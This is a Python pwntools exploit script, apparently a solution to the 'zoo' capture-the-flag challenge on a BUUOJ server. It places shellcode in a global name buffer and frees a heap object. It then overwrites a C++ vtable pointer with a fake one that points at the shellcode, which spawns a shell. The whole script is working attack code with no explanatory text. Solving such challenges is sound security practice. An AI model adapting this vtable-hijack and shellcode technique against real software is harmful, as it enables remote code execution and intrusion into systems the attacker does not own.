#encoding:utf-8
from pwn import *
context(os="linux", arch="amd64",log_level = "debug")

ip ="node3.buuoj.cn"
if ip:
    p = remote(ip,25738)
else:
    p = process("./zoo")#, aslr=0

elf = ELF("./zoo")
#libc = ELF("./libc-2.23.so")
libc = elf.libc
#-------------------------------------
def sl(s):
    p.sendline(s)
def sd(s):
    p.send(s)
def rc(timeout=0):
    if timeout == 0:
        return p.recv()
    else:
        return p.recv(timeout=timeout)
def ru(s, timeout=0):
    if timeout == 0:
        return p.recvuntil(s)
    else:
        return p.recvuntil(s, timeout=timeout)
def debug(msg=''):
    gdb.attach(p,'')
    pause()
def getshell():
    p.interactive()
#-------------------------------------

shellcode = asm(shellcraft.sh())

def add_dog(name,weight):
    ru(":")
    sl("1")
    ru(":")
    sl(name)
    ru(":")
    sl(str(weight))

def remove(idx):
    ru(":")
    sl("5")
    ru(":")
    sl(str(idx))

def listen(idx):
    ru(":")
    sl("3")
    ru(":")
    sl(str(idx))    

#gdb.attach(p,"b *0x40193E\nc\n")
nameofzoo = 0x605420

ru(":")
sl(shellcode + p64(nameofzoo))

add_dog("a"*8,0)
add_dog("b"*8,1)

# debug()
remove(0)
# pause()
fake_vptr = nameofzoo + len(shellcode)
add_dog("c"*72 + p64(fake_vptr),2)
#pause()
listen(0)
getshell()